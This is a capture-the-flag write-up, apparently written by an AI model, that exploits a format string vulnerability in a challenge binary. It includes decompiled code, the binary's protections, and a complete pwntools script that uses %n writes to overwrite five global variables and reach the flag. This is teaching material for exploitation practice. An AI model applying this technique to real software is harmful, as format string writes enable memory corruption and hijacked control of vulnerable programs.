Here is the formatted writeup for **Feel My Terror**.

---

# Feel My Terror

> **Description:** These mischievous elves have scrambled the good kids’ addresses! Now the presents can’t find their way home. Please help me fix them quickly — I can’t sort this out on my own.

## Initial Analysis

We are provided with a binary that asks us to fix some "addresses". Let's examine the decompiled code in Ghidra to understand the logic.

### The `main` Function

```c
undefined8 main(void) {
  // ... [Variable declarations]
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  
  // [Zeroing out local_d8 buffer truncated for brevity]
  
  info("Look at the mess the ELVES made:...");
  // Prints current values of arg1, arg2, arg3, arg4, arg5
  
  read(0, local_d8, 0xc5); // Reads user input
  
  printf(local_d8);        // <--- VULNERABILITY: Format String
  fflush(stdout);
  
  check_db();              // Checks if we fixed the values
  
  return 0;
}

```

The critical vulnerability is `printf(local_d8)`. Since the program prints our input buffer directly without a format specifier (like `"%s"`), we have a **Format String Vulnerability**. This allows us to read from and **write to** arbitrary memory addresses.

### The `check_db` Function

The program checks if we have successfully modified specific global variables (`arg1` through `arg5`).

```c
void check_db(void) {
  // ... [Opens flag.txt]
  
  // The check:
  if ((((arg1 == -0x21524111) && (arg2 == 0x1337c0de)) && (arg3 == -0xcc84542)) &&
     ((arg4 == 0x1337f337 && (arg5 == -0x5211113)))) {
       
    success("Thanks a lot my friend <3. Take this gift from me: \n");
    puts(local_48); // Prints flag
  }
  // ...
}

```

We need to overwrite these 5 global variables with specific values to pass the check and get the flag.

## Binary Protections

Checking the binary security features is crucial for determining our exploit strategy.

```text
Arch:     amd64-64-little
RELRO:    Full RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      No PIE (0x400000)

```

* **No PIE:** This is excellent news. It means the addresses of the global variables (`arg1` - `arg5`) are static. We don't need to leak a base address; we can hardcode the target addresses in our script.
* **Full RELRO:** We cannot overwrite the GOT (Global Offset Table), but that doesn't matter since we are targeting specific variables in the `.bss` section, not function pointers.

## Exploit Strategy

1. **Identify Target Values:** We need to convert the signed integers from the `if` statement into unsigned hex values for our payload.
* `arg1`: `-0x21524111`  `0xDEADBEEF`
* `arg2`: `0x1337c0de`
* `arg3`: `-0xcc84542`  `0xF337BABE`
* `arg4`: `0x1337f337`
* `arg5`: `-0x5211113`  `0xFADEEEED`


2. **Determine Offset:** By sending a cyclic pattern (e.g., `AAAA%p%p...`) to the binary, we determined the format string offset is **6**. This is where our input begins on the stack.
3. **Construct Payload:** We will use `pwntools` to generate a payload that uses `%n` specifiers to write the required values to the addresses of `arg1`-`arg5`.
* *Constraint:* The `read` buffer is only `0xc5` (197) bytes. We must ensure our payload fits. Using `write_size='short'` splits the writes into 2-byte chunks, which is generally more space-efficient than writing 1 byte at a time or full 4-byte integers.



## The Exploit Script

```python
from pwn import *
import ctypes

# Set up the binary context
exe = ELF('./vuln_binary')
context.binary = exe
context.log_level = 'info'

# 1. Get the static addresses of the target variables (No PIE)
arg1_addr = exe.symbols['arg1']
arg2_addr = exe.symbols['arg2']
arg3_addr = exe.symbols['arg3']
arg4_addr = exe.symbols['arg4']
arg5_addr = exe.symbols['arg5']

log.info(f"Targeting addresses starting at: {hex(arg1_addr)}")

# 2. Define the Offset
offset = 6

# Helper to convert signed ints to unsigned 32-bit integers
def get_val(v):
    return ctypes.c_uint32(v).value

# 3. Define the values we need to write
writes = {
    arg1_addr: get_val(-0x21524111), # 0xDEADBEEF
    arg2_addr: get_val(0x1337c0de),  # 0x1337C0DE
    arg3_addr: get_val(-0xcc84542),  # 0xF337BABE
    arg4_addr: get_val(0x1337f337),  # 0x1337F337
    arg5_addr: get_val(-0x5211113)   # 0xFADEEEED
}

# 4. Generate the payload
# We use 'short' (2 bytes) writes to optimize payload size
payload = fmtstr_payload(offset, writes, write_size='short')

# Check if we fit inside the 197 byte buffer
if len(payload) > 197:
    log.warning(f"Payload length {len(payload)} is too large! Trying byte optimization...")
    payload_byte = fmtstr_payload(offset, writes, write_size='byte')
    if len(payload_byte) < len(payload):
        log.info(f"Switched to byte writes. New length: {len(payload_byte)}")
        payload = payload_byte

log.info(f"Final Payload length: {len(payload)}")

# 5. Send the exploit
# p = remote('IP', PORT) 
p = process(exe.path) # For local testing
p.recvuntil(b"> ")
p.sendline(payload)
p.interactive()

```

### Result

Running the script overwrites the variables in memory. The `check_db` function validates the new values, passes the check, and prints the flag.

---

**Would you like me to explain how `fmtstr_payload` calculates the padding and `%n` values under the hood?**